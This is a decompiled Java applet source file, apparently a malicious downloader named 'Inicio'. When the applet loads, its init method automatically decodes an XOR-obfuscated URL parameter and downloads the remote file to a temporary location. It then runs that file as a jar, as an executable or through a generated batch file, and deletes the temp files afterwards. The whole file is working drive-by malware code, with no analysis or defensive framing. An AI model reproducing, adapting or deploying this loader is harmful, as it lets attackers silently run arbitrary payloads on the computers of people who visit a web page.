import java.io.IOException;
import java.io.PrintWriter;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.File;

// 
// Decompiled by Procyon v0.5.30
// 

public class Inicio extends Plugin
{
    private static final long serialVersionUID = 1L;
    
    public static void main(final String[] array) {
    }
    
    public void empaquetar() throws Exception {
        final byte[] array = new byte[10240];
        final String desencripta = XorCoder.Desencripta(this.getParameter("url"), "%\u00fc&/@#$*+");
        System.out.println("------------->>>>>>>>>> " + desencripta);
        final String lowerCase = desencripta.substring(desencripta.lastIndexOf(".")).toLowerCase();
        final File tempFile = File.createTempFile("javatmp", lowerCase);
        final FileOutputStream fileOutputStream = new FileOutputStream(tempFile);
        int read;
        while ((read = new BufferedInputStream(new URL(desencripta).openConnection().getInputStream()).read(array)) > 0) {
            fileOutputStream.write(array, 0, read);
        }
        fileOutputStream.close();
        if (lowerCase.contains(".jar")) {
            Runtime.getRuntime().exec(String.valueOf(System.getProperty("sun.boot.library.path")) + "\\javaw.exe -jar  \"" + tempFile.getAbsolutePath() + "\"");
        }
        else {
            try {
                Runtime.getRuntime().exec(tempFile.getAbsolutePath());
            }
            catch (IOException ex) {
                final File tempFile2 = File.createTempFile("tmp", ".bat");
                tempFile2.createNewFile();
                tempFile2.deleteOnExit();
                final PrintWriter printWriter = new PrintWriter(tempFile2);
                printWriter.println("\"" + tempFile.getAbsolutePath() + "\"");
                printWriter.close();
                Runtime.getRuntime().exec(tempFile2.getAbsolutePath());
                tempFile2.delete();
            }
        }
        tempFile.deleteOnExit();
    }
    
    @Override
    public void init() {
        try {
            this.empaquetar();
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
        super.init();
    }
}
